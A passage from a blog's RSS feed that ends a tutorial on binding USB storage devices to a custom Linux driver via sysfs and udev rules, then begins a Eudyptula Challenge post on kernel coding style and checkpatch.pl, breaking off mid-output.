</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn kernel: usb 1-4.3: Manufacturer: Generic
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn kernel: usb 1-4.3: SerialNumber: EFEC1147
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn kernel: usb-storage 1-4.3:1.0: USB Mass Storage device detected
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn kernel: scsi host3: usb-storage 1-4.3:1.0
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn mtp-probe[8926]: checking bus 1, device 12: &#34;/sys/devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3&#34;
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn mtp-probe[8939]: checking bus 1, device 12: &#34;/sys/devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">### COMMAND:-  lsusb 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Port 3: Dev 13, If 0, Class=Mass Storage, Driver=usb-storage, 480M
</span></span></code></pre></div><p>Above output clearly shows that the pen-drive was detected but it was assigned to another driver instead of my custom driver. So we need to unbind my device with currently associated device driver and then bind it with our device driver. It is actually very easy to do in newer kernels (anything&gt;=2.6.13-rc3). There are many resources for this topic on the Internet, but I found this one <a href="https://lwn.net/Articles/143397/">short and precise article on lwn.net</a>. TL-DR; I just had to invoke 2 commands from a terminal.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /bin/bash -c <span class="s1">&#39;echo 1-4.3:1.0 &gt; /sys/bus/usb/drivers/usb-storage/unbind&#39;</span>
</span></span><span class="line"><span class="cl">sudo /bin/bash -c <span class="s1">&#39;echo 1-4.3:1.0l &gt; /sys/bus/usb/drivers/ayedaemonUSBdriver/bind&#39;</span>
</span></span></code></pre></div><p>These are the files exposed by kernel to handle dynamic binding and unbinding from user-space. The number <code>1-4.3:1.0</code> the endpoint location specifier &hellip; I mean this is a specifier that can be used to locate the actual endpoint for the USB that needs this driver.</p>
<p>If we break it down it&rsquo;ll be much more understandable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">##  1-4.3:1.0
</span></span><span class="line"><span class="cl">1: root_hub
</span></span><span class="line"><span class="cl">4: My USB hub (usb hub extension connected to laptop usb port)
</span></span><span class="line"><span class="cl">3: USB device connected to that hub
</span></span><span class="line"><span class="cl">1: Config number
</span></span><span class="line"><span class="cl">0: Interface number
</span></span></code></pre></div><p>To summarize, the device naming scheme is somewhat like this -&gt; <code>root_hub-hub_port.internal_port:config.interface</code>. So If I directly plug my pen-drive into my laptop USB port, it should give me something like <code>1-*:1.0</code>.. because I know I&rsquo;m plugging it to bus 1 (It&rsquo;s my laptop, I know it), and then the <code>config.interface</code> part will be same as the old one. Interesting thing to note here is that since there is no external hub connected this time, so the <code>hub_port.internal_port</code> will just be <code>hub_port</code>. So I&rsquo;m expecting only 1 value in that place. Hence, <code>1-*:1.0</code> and in the logs, I got <code>1-2:1.0</code>.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/Yq7ioTdDP5GzLSrqOw/giphy.gif#center" alt=""  />
</p>
<p>In this era of laziness and automation, we will want to do some automation for binding/unbinding. What we would need is a program that keeps on listening on the device events and help us to run our commands when a particular event occurs&hellip;. <code>udev</code> can help us do that!!! All we have to do is write a simple rule and provide it to <code>udev</code> and the rest will be taken care of.</p>
<p>To create a udev rule, paste the below text in the following file - <code>/etc/udev/rules.d/99-custom-usb.rules</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ACTION==&#34;bind&#34;, SUBSYSTEMS==&#34;usb&#34;, \
</span></span><span class="line"><span class="cl">OPTIONS=&#34;log_level=debug&#34;, \
</span></span><span class="line"><span class="cl">ATTRS{idVendor}==&#34;058f&#34;, ATTRS{idProduct}==&#34;6387&#34;, \
</span></span><span class="line"><span class="cl">RUN+=&#34;/bin/bash -c &#39;echo $kernel &gt; /sys/bus/usb/drivers/usb-storage/unbind&#39;&#34;, \
</span></span><span class="line"><span class="cl">RUN+=&#34;/bin/bash -c &#39;echo $kernel &gt; /sys/bus/usb/drivers/ayedaemonUSBdriver/bind&#39;&#34;
</span></span></code></pre></div><p>The above rule matches the USB Attributes and triggers the <code>RUN</code> commands accordingly. If you want this rule to be more generic, remove the <code>ATTRS{idVendor}</code> and <code>ATTRS{idProduct}</code>. <a href="http://reactivated.net/writing_udev_rules.html">Read here</a> to learn more about writing udev rules.</p>
<p>If you change the C code and reload the module and remove the <code>ATTRS</code> selector from the udev rule, you can get a system where any <code>usb-storage</code> kind of devices will be automatically binded with <code>Driver=ayedaemonUSBdriver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Port 3: Dev 18, If 0, Class=Mass Storage, Driver=ayedaemonUSBdriver, 480M
</span></span><span class="line"><span class="cl">ID 058f:6387 Alcor Micro Corp. Flash Drive
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Port 1: Dev 17, If 0, Class=Mass Storage, Driver=ayedaemonUSBdriver, 480M
</span></span><span class="line"><span class="cl">ID 0930:6545 Toshiba Corp. Kingston DataTraveler 102/2.0 / HEMA Flash Drive 2 GB / PNY Attache 4GB Stick
</span></span></code></pre></div><h3 id="conclusion">Conclusion</h3>
<p>Writing a Linux USB device driver is not a difficult task if one understands how USB subsystem works behind the abstractions. This article just touches the surface of USB drivers and there is still a lot more to look out for&hellip; like USB urbs. If you want to continue learning more about USB drivers, most common recommendation on internet is - <a href="https://www.makelinux.net/ldd3/?u=chp-4-sect-2.shtml"><em>Linux Device Drivers: Chapter 13. USB Drivers</em></a>. This book is somewhat dated, but the content is still relevant.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://en.wikipedia.org/wiki/USB">https://en.wikipedia.org/wiki/USB</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://www.usb.org/">https://www.usb.org/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="http://www.linux-usb.org/USB-guide/book1.html">http://www.linux-usb.org/USB-guide/book1.html</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p><a href="http://www.linux-usb.org/usb.ids">http://www.linux-usb.org/usb.ids</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p><a href="https://www.usb.org/defined-class-codes">https://www.usb.org/defined-class-codes</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p><a href="https://www.kernel.org/doc/html/latest/driver-api/usb/index.html">https://www.kernel.org/doc/html/latest/driver-api/usb/index.html</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L67">https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L67</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/usb/ch9.h#L407">https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/usb/ch9.h#L407</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L232">https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L232</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L82">https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L82</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L374">https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L374</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L626">https://elixir.bootlin.com/linux/latest/source/include/linux/usb.h#L626</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/mod_devicetable.h#L127">https://elixir.bootlin.com/linux/latest/source/include/linux/mod_devicetable.h#L127</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Eudyptula Task4</title>
      <link>https://ayedaemon.github.io/post/2022/06/eudyptula-task-4/</link>
      <pubDate>Fri, 17 Jun 2022 16:14:27 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/06/eudyptula-task-4/</guid>
      <description>Task 4 for Eudyptula challenge</description>
      <content:encoded><![CDATA[<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">This is Task 04 of the Eudyptula Challenge
</span></span><span class="line"><span class="cl">------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Wonderful job in making it this far, I hope you have been having fun.
</span></span><span class="line"><span class="cl">Oh, you&#39;re getting bored, just booting and installing kernels?  Well,
</span></span><span class="line"><span class="cl">time for some pedantic things to make you feel that those kernel builds
</span></span><span class="line"><span class="cl">are actually fun!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Part of the job of being a kernel developer is recognizing the proper
</span></span><span class="line"><span class="cl">Linux kernel coding style.  The full description of this coding style
</span></span><span class="line"><span class="cl">can be found in the kernel itself, in the Documentation/CodingStyle
</span></span><span class="line"><span class="cl">file.  I&#39;d recommend going and reading that right now, it&#39;s pretty
</span></span><span class="line"><span class="cl">simple stuff, and something that you are going to need to know and
</span></span><span class="line"><span class="cl">understand.  There is also a tool in the kernel source tree in the
</span></span><span class="line"><span class="cl">scripts/ directory called checkpatch.pl that can be used to test for
</span></span><span class="line"><span class="cl">adhering to the coding style rules, as kernel programmers are lazy and
</span></span><span class="line"><span class="cl">prefer to let scripts do their work for them...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">And why a coding standard at all?  That&#39;s because of your brain (yes,
</span></span><span class="line"><span class="cl">yours, not mine, remember, I&#39;m just some dumb shell scripts).  Once your
</span></span><span class="line"><span class="cl">brain learns the patterns, the information contained really starts to
</span></span><span class="line"><span class="cl">sink in better.  So it&#39;s important that everyone follow the same
</span></span><span class="line"><span class="cl">standard so that the patterns become consistent.  In other words, you
</span></span><span class="line"><span class="cl">want to make it really easy for other people to find the bugs in your
</span></span><span class="line"><span class="cl">code, and not be confused and distracted by the fact that you happen to
</span></span><span class="line"><span class="cl">prefer 5 spaces instead of tabs for indentation.  Of course you would
</span></span><span class="line"><span class="cl">never prefer such a thing, I&#39;d never accuse you of that, it was just an
</span></span><span class="line"><span class="cl">example, please forgive my impertinence!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Anyway, the tasks for this round all deal with the Linux kernel coding
</span></span><span class="line"><span class="cl">style.  Attached to this message are two kernel modules that do not
</span></span><span class="line"><span class="cl">follow the proper Linux kernel coding style rules.  Please fix both of
</span></span><span class="line"><span class="cl">them up, and send it back to me in such a way that does follow the
</span></span><span class="line"><span class="cl">rules.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">What, you recognize one of these modules?  Imagine that, perhaps I was
</span></span><span class="line"><span class="cl">right to accuse you of the using a &#34;wrong&#34; coding style :)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Yes, the logic in the second module is crazy, and probably wrong, but
</span></span><span class="line"><span class="cl">don&#39;t focus on that, just look at the patterns here, and fix up the
</span></span><span class="line"><span class="cl">coding style, do not remove lines of code.
</span></span></code></pre></div><h3 id="coding-styles----what-and-why">Coding styles &ndash; what and why?</h3>
<p>We all have different styles and preferences in everything in life. Even while writing code, everyone loves to imprint their personalities in the code that brings originality and a sense of ownership and responsibility.</p>
<p>Coding styles are set of rules or suggestions to write code. The idea behind developing these sets of rules for coding style is very simple - to make code readable by everybody or just to make your brain habitual to a specific style so that you can easily understand the code writen by another person.</p>
<p>The code style depends mainly on the language, few decisions are made depending on the context, and if you switch from one to another. Some of these decisions might be:</p>
<ul>
<li>Comments (how and when you use them)</li>
<li>Tabs or spaces for indentation (the number of spaces is quite important)</li>
<li>Appropriate naming of variables and functions.</li>
<li>Code grouping an organization,</li>
<li>Patterns to be used or avoided.</li>
</ul>
<p><strong>But what happens when a whole team is working on one project?</strong></p>
<p>Everyone develops a certain style and for individual work, this is great&hellip; but when you need more people on your team, understanding different styles could become a problem to everyone.</p>
<p>This has been on my mind a lot lately. For instance, during a code review, I often question whether I should bring specific ways of coding into the discussion or not. How does it affect the application; Is it readable, is it easy to maintain?</p>
<p>Or perhaps I should leave it alone, thinking to myself — <em>Don’t be picky, it’s just their preference, it’s not a matter of right or wrong.</em></p>
<p>Linuc kernel developers has done an amazing job to build a coding style that is followed by mostly everybody who is getting involved in kernel development process.</p>
<h4 id="how-bad-can-it-go">How bad can it go?</h4>
<p>If we do not have a properly defined coding style, we might end up with mostly working but very unreadable code&hellip;. This can be very unhealty for a mere human being.</p>
<p>Let&rsquo;s take a simple example (In C programming language) to understand the need of coding styles.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;This is a very long line with some garbage text. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Pulvinar neque laoreet suspendisse interdum consectetur libero. Turpis nunc eget lorem dolor sed viverra ipsum nunc. Semper feugiat nibh sed pulvinar proin gravida hendrerit lectus. Turpis egestas sed tempus urna et. Ornare lectus sit amet est placerat. Quam elementum pulvinar etiam non quam. Consequat semper viverra nam libero. Nisl condimentum id venenatis a condimentum vitae. Vitae proin sagittis nisl rhoncus mattis rhoncus urna neque viverra.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Above code is very simple in terms of functionality - It prints a huge paragraph. The same code can also be written in the below style&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> 
</span></span><span class="line"><span class="cl"><span class="nf">main</span>
</span></span><span class="line"><span class="cl"><span class="p">()</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nf">printf</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;This is a very long line with some garbage text. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Pulvinar neque laoreet suspendisse interdum consectetur libero. Turpis nunc eget lorem dolor sed viverra ipsum nunc. Semper feugiat nibh sed pulvinar proin gravida hendrerit lectus. Turpis egestas sed tempus urna et. Ornare lectus sit amet est placerat. Quam elementum pulvinar etiam non quam. Consequat semper viverra nam libero. Nisl condimentum id venenatis a condimentum vitae. Vitae proin sagittis nisl rhoncus mattis rhoncus urna neque viverra.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span><span class="k">return</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>I know nobody will ever write code in this style..but it is still a possible option to write a working code.</p>
<p>Or you might be familiar with the below code&hellip;. Spoiler:- This prints a rotating donut. Read <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">this amazing article</a> to understand the maths behind it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">             <span class="n">k</span><span class="p">;</span><span class="kt">double</span> <span class="nf">sin</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">         <span class="p">,</span><span class="nf">cos</span><span class="p">();</span><span class="nf">main</span><span class="p">(){</span><span class="kt">float</span> <span class="n">A</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">       <span class="mi">0</span><span class="p">,</span><span class="n">B</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">z</span><span class="p">[</span><span class="mi">1760</span><span class="p">];</span><span class="kt">char</span> <span class="n">b</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">     <span class="mi">1760</span><span class="p">];</span><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1b</span><span class="s">[2J&#34;</span><span class="p">);</span><span class="k">for</span><span class="p">(;;</span>
</span></span><span class="line"><span class="cl">  <span class="p">){</span><span class="nf">memset</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">1760</span><span class="p">);</span><span class="nf">memset</span><span class="p">(</span><span class="n">z</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7040</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="mf">6.28</span><span class="o">&gt;</span><span class="n">j</span><span class="p">;</span><span class="n">j</span><span class="o">+=</span><span class="mf">0.07</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="mf">6.28</span>
</span></span><span class="line"><span class="cl"> <span class="o">&gt;</span><span class="n">i</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mf">0.02</span><span class="p">){</span><span class="kt">float</span> <span class="n">c</span><span class="o">=</span><span class="nf">sin</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">d</span><span class="o">=</span><span class="nf">cos</span><span class="p">(</span><span class="n">j</span><span class="p">),</span><span class="n">e</span><span class="o">=</span>
</span></span><span class="line"><span class="cl"> <span class="nf">sin</span><span class="p">(</span><span class="n">A</span><span class="p">),</span><span class="n">f</span><span class="o">=</span><span class="nf">sin</span><span class="p">(</span><span class="n">j</span><span class="p">),</span><span class="n">g</span><span class="o">=</span><span class="nf">cos</span><span class="p">(</span><span class="n">A</span><span class="p">),</span><span class="n">h</span><span class="o">=</span><span class="n">d</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span><span class="n">D</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="p">(</span><span class="n">c</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"> <span class="n">h</span><span class="o">*</span><span class="n">e</span><span class="o">+</span><span class="n">f</span><span class="o">*</span><span class="n">g</span><span class="o">+</span><span class="mi">5</span><span class="p">),</span><span class="n">l</span><span class="o">=</span><span class="nf">cos</span>      <span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">m</span><span class="o">=</span><span class="nf">cos</span><span class="p">(</span><span class="n">B</span><span class="p">),</span><span class="n">n</span><span class="o">=</span><span class="n">s</span>\
</span></span><span class="line"><span class="cl"><span class="nf">in</span><span class="p">(</span><span class="n">B</span><span class="p">),</span><span class="n">t</span><span class="o">=</span><span class="n">c</span><span class="o">*</span><span class="n">h</span><span class="o">*</span><span class="n">g</span><span class="o">-</span><span class="n">f</span><span class="o">*</span>        <span class="n">e</span><span class="p">;</span><span class="kt">int</span> <span class="n">x</span><span class="o">=</span><span class="mi">40</span><span class="o">+</span><span class="mi">30</span><span class="o">*</span><span class="n">D</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">l</span><span class="o">*</span><span class="n">h</span><span class="o">*</span><span class="n">m</span><span class="o">-</span><span class="n">t</span><span class="o">*</span><span class="n">n</span><span class="p">),</span><span class="n">y</span><span class="o">=</span>            <span class="mi">12</span><span class="o">+</span><span class="mi">15</span><span class="o">*</span><span class="n">D</span><span class="o">*</span><span class="p">(</span><span class="n">l</span><span class="o">*</span><span class="n">h</span><span class="o">*</span><span class="n">n</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="n">t</span><span class="o">*</span><span class="n">m</span><span class="p">),</span><span class="n">o</span><span class="o">=</span><span class="n">x</span><span class="o">+</span><span class="mi">80</span><span class="o">*</span><span class="n">y</span><span class="p">,</span>          <span class="n">N</span><span class="o">=</span><span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="n">f</span><span class="o">*</span><span class="n">e</span><span class="o">-</span><span class="n">c</span><span class="o">*</span><span class="n">d</span><span class="o">*</span><span class="n">g</span>
</span></span><span class="line"><span class="cl"> <span class="p">)</span><span class="o">*</span><span class="n">m</span><span class="o">-</span><span class="n">c</span><span class="o">*</span><span class="n">d</span><span class="o">*</span><span class="n">e</span><span class="o">-</span><span class="n">f</span><span class="o">*</span><span class="n">g</span><span class="o">-</span><span class="n">l</span>        <span class="o">*</span><span class="n">d</span><span class="o">*</span><span class="n">n</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="mi">22</span><span class="o">&gt;</span><span class="n">y</span><span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl"> <span class="n">y</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&amp;&amp;</span><span class="n">x</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&amp;&amp;</span><span class="mi">80</span><span class="o">&gt;</span><span class="n">x</span><span class="o">&amp;&amp;</span><span class="n">D</span><span class="o">&gt;</span><span class="n">z</span><span class="p">[</span><span class="n">o</span><span class="p">]){</span><span class="n">z</span><span class="p">[</span><span class="n">o</span><span class="p">]</span><span class="o">=</span><span class="n">D</span><span class="p">;;;</span><span class="n">b</span><span class="p">[</span><span class="n">o</span><span class="p">]</span><span class="o">=</span>
</span></span><span class="line"><span class="cl"> <span class="s">&#34;.,-~:;=!*#$@&#34;</span><span class="p">[</span><span class="n">N</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">?</span><span class="nl">N</span><span class="p">:</span><span class="mi">0</span><span class="p">];}}</span><span class="cm">/*#****!!-*/</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1b</span><span class="s">[H&#34;</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="mi">1761</span><span class="o">&gt;</span><span class="n">k</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="nf">putchar</span><span class="p">(</span><span class="n">k</span><span class="o">%</span><span class="mi">80</span><span class="o">?</span><span class="n">b</span><span class="p">[</span><span class="n">k</span><span class="p">]</span><span class="o">:</span><span class="mi">10</span><span class="p">);</span><span class="n">A</span><span class="o">+=</span><span class="mf">0.04</span><span class="p">;</span><span class="n">B</span><span class="o">+=</span>
</span></span><span class="line"><span class="cl">     <span class="mf">0.02</span><span class="p">;}}</span><span class="cm">/*****####*******!!=;:~
</span></span></span><span class="line"><span class="cl"><span class="cm">       ~::==!!!**********!!!==::-
</span></span></span><span class="line"><span class="cl"><span class="cm">         .,~~;;;========;;;:~-.
</span></span></span><span class="line"><span class="cl"><span class="cm">             ..,--------,*/</span>
</span></span></code></pre></div><p>Anyways, my point is that the code can become very unreadable and unmaintainable if no coding style guidelines are defined. Early in my journey, I engaged in all kinds of holy wars on code styles. I would read some article about why a particular convention was correct, while another was totally wrong. But I&rsquo;ve finally come to a conclusion - <strong>These things don&rsquo;t matter; Consistency and readability matters</strong>.</p>
<p>The development process of linux kernel is very chaotic with thousands of developers working completely remotely on the same code base. How do they do it without messing it all up??</p>
<p>Out of many reasons, one is that all kernel developers try best to follow the code style guidelines laid out in the official kernel documentations <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. Here they provide all the necessary details and examples to put their point. And still, it is just a recommendation not forcing anybody to be very specific about it.</p>
<h3 id="fixing-style-issue-problem">Fixing style issue problem</h3>
<p>In this task, we are provided with 2 different modules (Linux Kernel Modules)&hellip; and our job here is to fix the style coding as per the coding style.</p>
<p>You don&rsquo;t have to read the complete coding style to fix it, smart people have already built a tool that can check these issues and provide a warning to us in a clean way. Linux provides a <code>script/checkpatch.pl</code> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> script, for the same. This script can check the code for trivial style violations in patches and optionally corrects them. This tool can also be used for regular kernel source code files. Read more about this tool from official docs <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.</p>
<p>This is not a very unique idea, today we have linters and other tools that can check the style issues and report it or fix it automatically in your source code&hellip;.in almost all the program languages. You can add one such tool in you <code>pre-commit</code> hook or most IDEs have plugins for this, you can use those too.</p>
<p>Anyways, let&rsquo;s pick up a file and run the <code>checkpatch</code> tool against it. The code looked fine to me at first&hellip; it had a good filename at top and has got indentations.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">* helloworld.c
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">hello_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;Hello World!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">hello_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;See you later.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">hello_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">hello_exit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;ayedaemon&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Just a module&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>But it still does not follow the guidelines. You can check that using the tool - <code>checkpatch.pl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">## COMMAND -  ../linux/scripts/checkpatch.pl -f helloworld.c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WARNING: Missing or malformed SPDX-License-Identifier tag in line 1
</span></span><span class="line"><span class="cl">#1: FILE: helloworld.c:1:
</span></span><span class="line"><span class="cl">+/*
